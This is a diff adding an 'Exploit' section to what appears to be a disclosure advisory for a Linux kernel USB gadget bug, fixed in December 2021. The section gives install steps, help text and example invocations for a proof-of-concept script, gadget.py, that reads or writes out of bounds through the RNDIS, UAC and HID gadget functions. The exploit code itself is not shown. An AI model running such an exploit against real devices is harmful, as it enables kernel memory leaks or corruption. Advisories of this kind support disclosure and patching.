@@ -216,6 +216,36 @@ Limit the transfer phase size to min(len, buffer_size) in affected control reque
 - 09.12.2021 - draft patch provided by Kernel security team
 - 12.12.2021 - fix merged to main Linux kernel tree (public)
 
+## Exploit
+
+The gadget.py script requires pyusb. You can install this package via pip as below.
+
+> python3 -m pip install pyusb
+
+Help can be accessed with -h or --help parameters.
+
+```
+usage: gadget.py [-h] -v VID -p PID [-l LENGTH] [-d {read,write}]
+                 [-f {rndis,uac1,uac1_legacy,uac2,hid}]
+
+Sample exploit for RNDIS gadget class
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -v VID, --vid VID     vendor id
+  -p PID, --pid PID     product id
+  -l LENGTH, --length LENGTH
+                        lenght of data to write
+  -d {read,write}, --direction {read,write}
+                        direction of operation from host perspective
+  -f {rndis,uac1,uac1_legacy,uac2,hid}, --function {rndis,uac1,uac1_legacy,uac2,hid}
+```
+
+Example invocations:
+> ./gadget.py -v 0x1b67 -p 0x400c -f uac1
+> ./gadget.py -v 0x1b67 -p 0x400c -f uac1 -d write
+> ./gadget.py -v 0x18d1 -p 0x4e23 -f rndis
+
 ## Final notes
 
 Please update your kernel.
